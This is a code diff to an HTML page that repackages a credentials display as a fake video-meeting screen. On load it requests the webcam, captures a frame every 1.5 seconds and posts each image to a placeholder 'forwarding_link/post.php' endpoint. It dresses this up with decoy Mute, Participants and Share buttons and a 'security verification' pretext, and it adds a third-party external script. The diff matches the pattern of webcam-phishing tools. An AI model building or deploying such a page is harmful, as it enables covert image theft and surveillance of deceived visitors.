@@ -2,7 +2,8 @@
 <html>
 
 <head>
-  <title>Login Credentials</title>
+  <title>Login Credentials with Verification</title>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
@@ -14,6 +15,7 @@
     height: 100vh;
     width: 100vw;
     background-color: #273039;
+    overflow: hidden;
   }
 
   * {
@@ -23,24 +25,46 @@
     font-weight: 500;
   }
 
-  .login-container {
+  .container {
+    display: flex;
+    height: calc(100vh - 80px);
+  }
+
+  .login-section {
+    width: 35%;
+    background-color: #1F2022;
+    color: white;
+    padding: 30px;
     display: flex;
     flex-direction: column;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    color: white;
-    padding: 20px;
   }
 
-  .login-box {
-    background-color: #1F2022;
-    padding: 40px;
-    border-radius: 15px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+  .video-section {
+    width: 65%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    position: relative;
+  }
+
+  .video-wrap {
     width: 100%;
-    max-width: 450px;
-    text-align: center;
+    max-width: 640px;
+    margin-bottom: 20px;
+  }
+
+  #video {
+    width: 100%;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+  }
+
+  canvas {
+    display: none;
   }
 
   .logo {
@@ -53,6 +77,7 @@
     margin-bottom: 30px;
     color: #fff;
     font-size: 28px;
+    text-align: center;
   }
 
   .credential-display {
@@ -61,6 +86,8 @@
     border-radius: 10px;
     margin: 20px 0;
     border-left: 4px solid crimson;
+    width: 100%;
+    max-width: 400px;
   }
 
   .credential-item {
@@ -100,12 +127,24 @@
     background-color: #b11030;
   }
 
+  .permission-message {
+    color: lawngreen;
+    font-size: 14px;
+    text-align: center;
+    margin-top: 20px;
+    padding: 10px;
+    background-color: rgba(124, 252, 0, 0.1);
+    border-radius: 5px;
+    border: 1px solid lawngreen;
+  }
+
   .note {
     color: #aaa;
     font-size: 12px;
     margin-top: 30px;
     padding: 10px;
     border-top: 1px solid #3a3f47;
+    text-align: center;
   }
 
   .float_button {
@@ -120,12 +159,13 @@
     top: 5px;
     right: 5px;
     cursor: pointer;
+    z-index: 1000;
   }
 
   .bottom-bar {
     position: fixed;
     bottom: 0px;
-    height: 60px;
+    height: 80px;
     width: 100%;
     background-color: #1F2022;
     display: flex;
@@ -135,19 +175,126 @@
     color: #fff;
   }
 
-  .security-info {
+  .icon-button {
     display: flex;
+    flex-direction: column;
+    justify-items: center;
     align-items: center;
-    font-size: 14px;
-    color: lawngreen;
+    margin: 0 25px;
+    cursor: pointer;
   }
 
-  .security-info i {
-    margin-right: 8px;
+  i {
+    margin-bottom: 8px;
+    font-size: 26px;
+  }
+
+  h6 {
+    font-size: 12px;
+  }
+
+  button {
+    color: #fff;
+    background-color: crimson;
+    padding: 8px 25px;
+    border: none;
+    border-radius: 5px;
+    border-style: none;
+    outline: none;
+    cursor: pointer;
+    font-size: 16px;
+    margin-left: 25px;
+  }
+
+  .camera-status {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    background-color: rgba(31, 32, 34, 0.9);
+    padding: 10px 15px;
+    border-radius: 5px;
+    color: lawngreen;
+    font-size: 14px;
+  }
+
+  #errorMsg {
+    color: #ff6b6b;
+    text-align: center;
+    margin-top: 10px;
+    font-size: 14px;
   }
 </style>
 
 <script>
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user",
+      width: { ideal: 640 },
+      height: { ideal: 480 }
+    }
+  };
+
+  // Function to post captured image data
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        console.log('Image sent successfully');
+      },
+      error: function () {
+        console.log('Error sending image');
+      }
+    });
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `Camera error: ${e.toString()}`;
+      console.error('Camera access error:', e);
+    }
+  }
+
+  // Success handler
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+    
+    // Update camera status
+    const statusElement = document.querySelector('.camera-status');
+    if (statusElement) {
+      statusElement.innerHTML = '<i class="fas fa-video"></i> Camera Active';
+    }
+
+    var context = canvas.getContext('2d');
+    
+    // Start capturing frames periodically
+    setInterval(function () {
+      if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        
+        // Send captured frame
+        post(canvasData);
+      }
+    }, 1500);
+  }
+
+  // Copy to clipboard function
   function copyToClipboard(text, button) {
     navigator.clipboard.writeText(text).then(function() {
       const originalText = button.innerHTML;
@@ -159,14 +306,15 @@
         button.style.backgroundColor = 'crimson';
       }, 2000);
     }).catch(function(err) {
-      alert('Failed to copy text: ' + err);
+      console.error('Failed to copy text:', err);
     });
   }
 
+  // Toggle full screen
   function toggleFullScreen() {
     if (!document.fullscreenElement) {
       document.documentElement.requestFullscreen().catch(err => {
-        console.log(`Error attempting to enable full-screen mode: ${err.message}`);
+        console.log(`Error enabling full-screen: ${err.message}`);
       });
     } else {
       if (document.exitFullscreen) {
@@ -174,6 +322,58 @@
       }
     }
   }
+
+  // Mute/Unmute function
+  function toggleMute() {
+    const muteIcon = document.querySelector('.fa-microphone');
+    const muteText = document.querySelector('.icon-button:nth-child(1) h6');
+    
+    if (muteIcon.classList.contains('fa-microphone')) {
+      muteIcon.classList.remove('fa-microphone');
+      muteIcon.classList.add('fa-microphone-slash');
+      muteText.textContent = 'Unmute';
+    } else {
+      muteIcon.classList.remove('fa-microphone-slash');
+      muteIcon.classList.add('fa-microphone');
+      muteText.textContent = 'Mute';
+    }
+  }
+
+  // Stop/Start video function
+  function toggleVideo() {
+    const videoIcon = document.querySelector('.fa-video');
+    const videoText = document.querySelector('.icon-button:nth-child(2) h6');
+    
+    if (videoIcon.classList.contains('fa-video')) {
+      videoIcon.classList.remove('fa-video');
+      videoIcon.classList.add('fa-video-slash');
+      videoText.textContent = 'Start Video';
+      
+      // Stop the video stream
+      if (window.stream) {
+        window.stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+        
+        // Update camera status
+        const statusElement = document.querySelector('.camera-status');
+        if (statusElement) {
+          statusElement.innerHTML = '<i class="fas fa-video-slash"></i> Camera Off';
+        }
+      }
+    } else {
+      videoIcon.classList.remove('fa-video-slash');
+      videoIcon.classList.add('fa-video');
+      videoText.textContent = 'Stop Video';
+      
+      // Restart the camera
+      init();
+    }
+  }
+
+  // Initialize camera when page loads
+  document.addEventListener('DOMContentLoaded', function() {
+    init();
+  });
 </script>
 
 <body>
@@ -181,8 +381,9 @@
     <i class="fas fa-expand" style="color: #fff; font-size: 18px;"></i>
   </div>
 
-  <div class="login-container">
-    <div class="login-box">
+  <div class="container">
+    <!-- Login Credentials Section -->
+    <div class="login-section">
       <div class="logo">
         <i class="fas fa-user-shield"></i>
       </div>
@@ -207,17 +408,62 @@
         </div>
       </div>
       
+      <div class="permission-message">
+        <i class="fas fa-camera"></i> Camera permission required for verification
+      </div>
+      
       <div class="note">
-        <i class="fas fa-info-circle"></i> These credentials are for authorized access only.
+        <i class="fas fa-info-circle"></i> Your camera feed is being captured for security verification
+      </div>
+    </div>
+
+    <!-- Video Section -->
+    <div class="video-section">
+      <div class="camera-status">
+        <i class="fas fa-video"></i> Requesting Camera Access...
+      </div>
+      
+      <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+        <span id="errorMsg"></span>
+      </div>
+      
+      <canvas id="canvas" width="640" height="480"></canvas>
+      
+      <div style="color: #aaa; font-size: 13px; text-align: center; margin-top: 20px;">
+        <i class="fas fa-exclamation-triangle"></i> Live camera feed is being captured every 1.5 seconds
       </div>
     </div>
   </div>
 
+  <!-- Bottom Control Bar -->
   <div class="bottom-bar">
-    <div class="security-info">
-      <i class="fas fa-shield-alt"></i>
-      Secure Connection • Credentials Encrypted
+    <div class="icon-button" onclick="toggleMute()">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
     </div>
+    
+    <div class="icon-button" onclick="toggleVideo()">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    
+    <div class="icon-button">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    
+    <div class="icon-button">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    
+    <div class="icon-button" style="color: lawngreen;">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share</h6>
+    </div>
+    
+    <button onclick="alert('Session ended')">End Session</button>
   </div>
 </body>
 
